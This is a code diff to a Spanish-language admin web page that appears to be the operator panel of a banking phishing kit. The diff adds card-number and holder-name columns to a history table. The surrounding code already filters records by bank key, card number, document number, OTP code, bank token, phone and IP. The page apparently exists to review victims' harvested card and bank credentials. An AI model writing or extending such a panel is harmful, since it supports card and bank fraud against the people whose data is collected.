@@ -238,8 +238,8 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                 </div>
                 <div class="table-wrap">
                     <table>
-                        <thead><tr><th class="checkbox-col"><input type="checkbox" id="checkAllHistorial"></th><th>Fecha</th><th>IP</th><th>Acciones</th></tr></thead>
-                        <tbody id="tbodyHistorial"><tr><td colspan="4" class="empty">Cargando...</td></tr></tbody>
+                        <thead><tr><th class="checkbox-col"><input type="checkbox" id="checkAllHistorial"></th><th>Fecha</th><th>Tarjeta</th><th>Nombre</th><th>IP</th><th>Acciones</th></tr></thead>
+                        <tbody id="tbodyHistorial"><tr><td colspan="6" class="empty">Cargando...</td></tr></tbody>
                     </table>
                 </div>
             </div>
@@ -599,7 +599,7 @@ function renderHistorial() {
     if (filtro) {
         lista = lista.filter(h => { const datos = h.datos || {}; const texto = [ h.bancoKey, datos.titular, datos.nombres, datos.apellidos, datos.docNumber, datos.documento, datos.tarjeta, datos.identificacion, datos.token, datos.otp, datos.ip, datos.telefono, datos.cardBrand, datos.bankName ].filter(Boolean).join(' ').toLowerCase(); return texto.includes(filtro); });
     }
-    if (!lista.length) { tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin registros en el historial</td></tr>'; actualizarBtnBorrarHistorial(); return; }
+    if (!lista.length) { tbody.innerHTML = '<tr><td colspan="6" class="empty">Sin registros en el historial</td></tr>'; actualizarBtnBorrarHistorial(); return; }
     tbody.innerHTML = lista.map(h => {
         const datos = h.datos || {};
         const fecha = new Date(h.fecha).toLocaleString('es-CO');
@@ -626,11 +626,13 @@ function renderHistorial() {
             <tr>
                 <td class="checkbox-col"><input type="checkbox" class="check-historial" data-id="${escapeHtml(h.id)}" ${checked}></td>
                 <td class="dato" style="max-width:120px;">${escapeHtml(fecha)}</td>
+                <td class="dato mono"><b>${escapeHtml(tarjeta)}</b></td>
+                <td class="dato">${escapeHtml(truncar(nombres, 20))}</td>
                 <td class="ip">${escapeHtml(datos.ip || '-')}</td>
                 <td><button class="btn" style="background:#3b82f6; color:white; font-size: 16px; padding: 2px 10px;" onclick="toggleDetalle('${escapeHtml(h.id)}')">👁️</button></td>
             </tr>
             <tr id="detalle-${escapeHtml(h.id)}" class="fila-detalle ${abierta}">
-                <td colspan="4">
+                <td colspan="6">
                     <div class="detalle-container">
                         <div class="detalle-grid">
                             <div class="detalle-seccion-titulo" style="grid-column: 1/-1;">👤 Datos Personales</div>
